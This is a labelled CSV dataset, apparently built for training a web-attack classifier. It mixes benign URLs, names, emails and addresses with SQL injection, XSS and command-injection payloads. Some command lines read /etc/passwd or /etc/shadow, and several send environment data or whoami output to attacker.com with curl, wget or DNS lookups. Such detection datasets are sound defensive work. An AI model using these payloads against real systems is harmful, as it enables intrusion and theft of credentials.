payload,label
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",1
/login?redirect_url=/dashboard/user/652729,0
1')) as qswu where 6377=6377;select case when 5433=6458 then 1 else null end--,1
/product?id=96356&utm_source=facebook&campaign=sale,0
prevost_toby@ballobar.com.ad,0
"-3492"" where 4094=4094 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",1
46388,0
escribida,0
amberina,0
/team/verona/fHkwMMrd/statistics,0
espina796,0
wei-tsig8,0
/search?id=kma251,0
armes@muchacha.com.lr,0
2532457145340118,0
/assets/style.css?page=admin216,0
/assets/style.css?user=contact667,0
"1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('tvcm'='tvcm",1
atendedor,0
/assets/style.css?id=123879,0
"1' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'ebuo'='ebuo",1
"1%"" order by 1#",1
"1)) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((5524=5524",1
/search?id=kma502,0
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)",1
/team/verona/IrJ5TisR/statistics,0
/product?id=151728&utm_source=facebook&campaign=sale,0
ridgeley_fechner@beesmer.ye,0
/team/verona/5SoHPgo5/statistics,0
/assets/style.css?user=kma98,0
16812,0
(select 2527 from pg_sleep(5)),1
/api/v1/users?user=hải37,0
/assets/style.css?page=123736,0
-4339) where 7178=7178 or 4008=7232,1
palau-saverdera,0
"1"")) as ccjk where 1932=1932 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
-6377' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'qcms' like 'qcms,1
842is2n,0
| cat$@ /etc/passwd,1
/login.html?token=kma604,0
"1'||(select 'fpfl' from dual where 1434=1434 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",1
trek_,0
tristan,0
/product?id=836339&utm_source=facebook&campaign=sale,0
sineiro herranz,0
spears,0
"1'));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (('frpo' like 'frpo",1
/api/v1/users?q=2026864,0
/team/verona/PRbkSUfT/statistics,0
| sleep 5,1
/api/v1/auth?token=APcQMYhQ,0
"""; who${x}ami; """,1
82751097h,0
"infantes de carrion, 122",0
/product?id=454596&utm_source=facebook&campaign=sale,0
/search?page=2026595,0
"1);call regexp_substring(repeat(right(char(3702),0),500000000),null) and (9646=9646",1
1))) rlike (select * from (select(sleep(5)))vwyq)#,1
/search?id=book881,0
48083550a,0
/product?id=826911&utm_source=facebook&campaign=sale,0
/product/detail?token=profile989,0
mulet lichtle,0
/search?user=apple364,0
/index.php?id=contact983,0
mendiz espn,0
cnudde.mccauley@waikilu.so,0
1'+(select twyt where 3376=3376 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))+',1
1'||(select 'tzxr' from dual where 2934=2934 and 4595=4595#,1
"-1<DIV STYLE=""background-image: url(javascript:document.cookie=true;)"">",1
/login?redirect_url=/dashboard/user/954314,0
gloriane,0
-1<SCRIPT>a=/CrossSiteScripting/\ndocument.cookie=true;</SCRIPT>,1
1'||(select 'nvvm' from dual where 5567=5567 rlike (select * from (select(sleep(5)))sgvo))||',1
crioja,0
/product?id=213752&utm_source=facebook&campaign=sale,0
08806627l,0
&#60,1
/login?redirect_url=/dashboard/user/128752,0
/product?id=352505&utm_source=facebook&campaign=sale,0
"& python -c 'import os;os.system(""id"")'",1
superable,0
vopalens,0
/assets/style.css?user=hải424,0
1 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),1
"-8608"" or 5460=4461--",1
/home?id=contact548,0
/assets/style.css?page=book282,0
"1)) as vycb where 3524=3524 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
/team/verona/Q1tYGK6t/statistics,0
"1')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('nvsy' like 'nvsy",1
-2817) where 1212=1212 or 3266=1102,1
bernaden,0
"<TABLE BACKGROUND=""javascript:document.cookie=true;"">",1
amontona+r,0
mcduffie,0
5083,0
%uff1cscript%uff1ealert(document.cookie)%uff1c/script%uff1ealert,1
/product?id=585925&utm_source=facebook&campaign=sale,0
"<button.onclick=""alert(string.fromcharcode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,110,103,64,82,69,77,7,86,69,34,41,60,47,115,99,114,105,112,116,62));"">string:from.char.code</button></body></html>",1
1214,0
"-6407') or elt(1631=4946,4946) and ('jpnz'='jpnz",1
v9n939z6,0
34126,0
/api/v1/users?token=kma186,0
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))-- zvkh",1
5139,0
"1"") where 5850=5850 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",1
; cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd,1
/product?id=631931&utm_source=facebook&campaign=sale,0
"-4453'))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('boxt'='boxt",1
atrazar,0
/product?id=220275&utm_source=facebook&campaign=sale,0
"1"" or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",1
1' rlike (select (case when (6855=1056) then 1 else 0x28 end)) and 'pmrz' like 'pmrz,1
2857564208258288,0
; cat /e*c/p*ss*d,1
|| ping -c 1 $(whoami).attacker.com,1
rancar,0
ubaldo,0
SELECT user FROM dual;,1
feamma,0
"-8982'+(select anyd where 5358=5358 union all select 5358,5358,5358,5358,5358,5358#",1
"""x` `<script>alert(1)</script>""` `>",1
/login.html?category=123813,0
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'sqvt' like 'sqvt,1
"1'+(select lgkd where 7801=7801 and elt(4249=4249,7259))+'",1
cerralbo,0
/api/v1/auth?token=1CmLUAGb,0
/search?page=kma971,0
"1"")) as ufba where 4049=4049;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
wun,0
alfredo calderon 136,0
halford,0
oropelero,0
09109,0
"1) as ndgd where 2367=2367 or 8156=(select count(*) from generate_series(1,5000000))--",1
peaflor,0
|| printenv | curl -X POST -d @- http://attacker.com,1
"estrada mendiarte s/n, 10?a",0
"-6073""))) or 9502=2012#",1
/search?id=kma756,0
clodoveo,0
pulsmetro,0
/index.php?token=shoes23,0
/product/detail?user=202622,0
"1) or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
kurtiz_saiah4@magadan.com.ro,0
rom87231o,0
"1%'))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (('%'='",1
"-9227) where 6723=6723 union all select 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--",1
"1 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
"1"") as ivuv where 5691=5691;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
& cat /etc/shadow | base64 | curl -X POST -d @- http://attacker.com,1
/product/detail?category=admin237,0
"1"") and 7533=7533 and (""yqzq""=""yqzq",1
3154021344584169,0
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('cysu' like 'cysu",1
-1816%'))) union all select 2072--,1
/product?id=992699&utm_source=facebook&campaign=sale,0
/product/detail?category=apple445,0
"1))) and 3824=benchmark(5000000,md5(0x76555642)) and (((6556=6556",1
/team/verona/MhKvCdSg/statistics,0
/home?q=shoes459,0
/team/verona/HR9QjrtQ/statistics,0
/api/v1/auth?token=Yyd7MIiI,0
/login?redirect_url=/dashboard/user/790827,0
"1' and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'moyb'='moyb",1
rio eo 144,0
/assets/style.css?user=profile770,0
wilson@autoconstruccion.fi,0
"1%"");select case when 9390=5752 then 1 else null end--",1
echecopar torrella,0
c/ dionisio acebal 41,0
/assets/style.css?category=admin766,0
"1""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""adwg"" like ""adwg",1
/team/verona/HZ4uLIGR/statistics,0
89,0
/index.php?id=shoes328,0
/product?id=772791&utm_source=facebook&campaign=sale,0
v$idr3ar,0
/api/v1/users?page=admin673,0
/api/v1/auth?token=G86Zhncn,0
/search?token=contact260,0
-8404)) order by 1--,1
/team/verona/kTnYnwEF/statistics,0
kawas kercooff,0
"1%""));iif(5257=5257,1,1/0)",1
"1""))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""wvyb""=""wvyb",1
<script>alert(1);</script>,1
01150051m,0
serret@sierradealcaraz.dj,0
37759460s,0
"|| wget --post-data=""data=$(whoami)"" http://attacker.com/receive",1
/search?id=kma210,0
"1"") or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""rwlq""=""rwlq",1
/api/v1/users?q=hải474,0
/login?redirect_url=/dashboard/user/791064,0
escobedo,0
18684547z,0
chen-che,0
agenor,0
"""; who$()ami; """,1
"<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>",1
/api/v1/users?category=2026551,0
enz4riz7r,0
/login.html?q=apple2,0
"1)) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
koprulu,0
villena,0
laneuville@hangarcentrodelautomovil.sh,0
<!--[if gte IE 4]>   <SCRIPT>alert('CrossSiteScripting');</SCRIPT>   <![endif]-->,1
jaspe ochoa,0
"1"") and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""rvub"" like ""rvub",1
leocadia,0
9270,0
"1) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",1
"1"" union all select null--",1
lazo,0
/login.html?user=contact566,0
"-1598))) union all select 9418,9418,9418,9418,9418,9418,9418#",1
/login.html?token=hải690,0
ostapchuk casal,0
"1'||(select 'vwop' where 8536=8536 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
koline.mathieson@viavilano.lv,0
4789967077221120,0
barcones,0
51,0
"<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('CrossSiteScripting');"">]]>",1
&& host $(whoami).attacker.com,1
irizar morata,0
fanning_shepherd@bruoseguridad.name,0
"1""))) union all select null,null,null#",1
43425,0
"-9272%""))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""%""=""",1
/login.html?id=profile716,0
melero benaducci,0
donovan,0
kwasniewska.tamburi@testdevelcidad.cr,0
c/ rio segura 76,0
"1'||(select 'bmyt' from dual where 9407=9407 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",1
-7552 or 6872=6872,1
"1' where 1895=1895 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
amelio,0
"1' union all select null,null,null,null,null,null,null,null,null--",1
/api/v1/auth?token=L4AIfHg6,0
jongwoei,0
"1%')));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
arnold,0
milligan,0
/assets/style.css?token=contact400,0
/team/verona/757F0EmN/statistics,0
/home?q=shoes852,0
muduex,0
9429551402633786,0
"-5014%""))) or 3348=2430--",1
1';select (case when (9556=7122) then 9556 else 9556*(select 9556 from information_schema.character_sets) end)#,1
/product?id=579549&utm_source=facebook&campaign=sale,0
fennell,0
kindermann@lawn.je,0
"calle virgen de la estrella, 196",0
basilisa,0
| cat</etc/passwd;,1
/login?redirect_url=/dashboard/user/714173,0
& whoami,1
1 where 8966=8966;if(1087=5839) select 1087 else drop function zzeh--,1
/index.php?q=123782,0
-2573)) order by 1#,1
calle magnolia 157,0
22367,0
/login?redirect_url=/dashboard/user/543395,0
/product?id=598915&utm_source=facebook&campaign=sale,0
4945,0
/product?id=492095&utm_source=facebook&campaign=sale,0
7770,0
nowack@softwaresaas.bm,0
/login.html?page=2026721,0
/assets/style.css?q=profile478,0
/assets/style.css?page=123168,0
"1 or 8421=(select count(*) from generate_series(1,5000000))# jmki",1
"1""))) and 7533=7533 and (((""xopd""=""xopd",1
pampanas soto,0
"1))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (((6583=6583",1
-5769) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq'),1
90179643r,0
denostable,0
5076820691273276,0
f36hu1a,0
mckenney,0
/api/v1/users?q=123272,0
' OR 1=1--,1
ervin,0
/search?category=123663,0
/index.php?category=contact221,0
"1"")) as ngvf where 9912=9912 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
/api/v1/auth?token=cOQH0QsJ,0
calle san juan 151 1e,0
folch pintado,0
"1))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((9462=9462",1
tersilio,0
"1"") as vcvw where 2445=2445 and 8594=(select 8594 from pg_sleep(5))--",1
b4rl942r7,0
/login?redirect_url=/dashboard/user/169512,0
c95cinaci7n,0
/product/detail?q=admin335,0
-3582) where 5873=5873 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1
"1"")) as hbfi where 4773=4773 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
/team/verona/ywgALkl2/statistics,0
"1' where 2690=2690;select count(*) from generate_series(1,5000000)--",1
"1"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""vukd""=""vukd",1
/api/v1/users?category=book636,0
/login?redirect_url=/dashboard/user/565076,0
propaganda,0
castells rel,0
inglis@baltasarsantos.vu,0
1') as inid where 7812=7812 or 6793=(select 6793 from pg_sleep(5))--,1
/login.html?category=123390,0
monelli@carimartin.gd,0
"<SPAN DATASRC=""#CrossSiteScripting"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",1
"1 and 2388=benchmark(5000000,md5(0x6d457153))#",1
/index.php?token=shoes683,0
9115119907815313,0
/product?id=73938&utm_source=facebook&campaign=sale,0
"<img src=""javascript:document.cookie=true;"">",1
15553,0
cendejas de la torre,0
galt@automovilesalhambra.kr,0
dahlke8@elviajehacomenzado.sv,0
;ls$1,1
"-5672')) union all select 9371,9371,9371,9371,9371,9371--",1
"1%"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
/api/v1/auth?token=GqmnKQWP,0
86et4ar,0
vosu,0
1' where 4403=4403 rlike sleep(5)#,1
"1"")) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""qyew""=""qyew",1
/index.php?id=apple376,0
/product?id=113907&utm_source=facebook&campaign=sale,0
/search?user=profile962,0
/assets/style.css?user=contact415,0
/api/v1/users?token=kma477,0
12190,0
lusa,0
4271773841923976,0
1 where 1931=1931 and sleep(5)--,1
darice,0
1) rlike sleep(5),1
cuad5in1m3o,0
"-6292) union all select 7499,7499,7499,7499,7499,7499,7499--",1
"1')) and 3824=benchmark(5000000,md5(0x76555642)) and (('obeh'='obeh",1
/home?page=contact310,0
/product?id=352311&utm_source=facebook&campaign=sale,0
"| cat /etc/pass""w""d",1
ronaldso,0
norma,0
/product?id=191882&utm_source=facebook&campaign=sale,0
39694,0
/login?redirect_url=/dashboard/user/720878,0
cecilia,0
"1%"" union all select null,null,null,null#",1
"c/ juan de bustamante, 30, 10b",0
camp fein,0
test'| whoami |'test,1
aparicio andreu,0
/api/v1/auth?token=sCdLMJcV,0
1096,0
/product?id=549238&utm_source=facebook&campaign=sale,0
/team/verona/m6Nrsyti/statistics,0
/login.html?user=profile540,0
erguven,0
"1"")) as dshc where 9911=9911 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"torre, la",0
1'+(select zwsr where 6567=6567;select pg_sleep(5))+',1
"<body background=""javascript:alert('crosssitescripting')"">",1
sonoe,0
"-8612"") or 4043=3083 and (""pjzo"" like ""pjzo",1
/team/verona/xASunfGa/statistics,0
"-5606) union all select 7118,7118,7118,7118,7118,7118,7118,7118,7118#",1
luis mara,0
"-2748')) as gazw where 4624=4624 union all select 4624,4624#",1
"1"") as jaxh where 6318=6318 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",1
7449583219109875,0
/search?id=contact103,0
/team/verona/HKrjsF6W/statistics,0
45210940r,0
/api/v1/auth?token=4IUnjbbt,0
"1'+(select 'nzgq' where 7230=7230 and elt(1210=1210,sleep(5)))+'",1
tabuyo-cardille@multaspendientes.bf,0
walliw,0
/product?id=173889&utm_source=facebook&campaign=sale,0
cazoln,0
"dir+c:"",7,cmdi,anom ||+dir|c:""",1
/product?id=358644&utm_source=facebook&campaign=sale,0
/search?user=book794,0
/team/verona/CKtp7SiA/statistics,0
2680573956820155,0
nava de bjar,0
paragon.calithness@callalelaboca.be,0
8578,0
terrateig,0
5812483495422600,0
/assets/style.css?token=2026305,0
31392,0
-8409)) as ipbz where 9984=9984 or 3371=3869,1
1);select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1
c1lab8,0
/team/verona/t2iPcg8J/statistics,0
caleruega,0
">""exp/*<A STYLE='no\CrossSiteScripting:noCrossSiteScripting(""*//*"");CrossSiteScripting:ex/*CrossSiteScripting*//*/*/pression(document.cookie=true)'>",1
99431698f,0
van_mete2,0
-4104%' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and '%'=',1
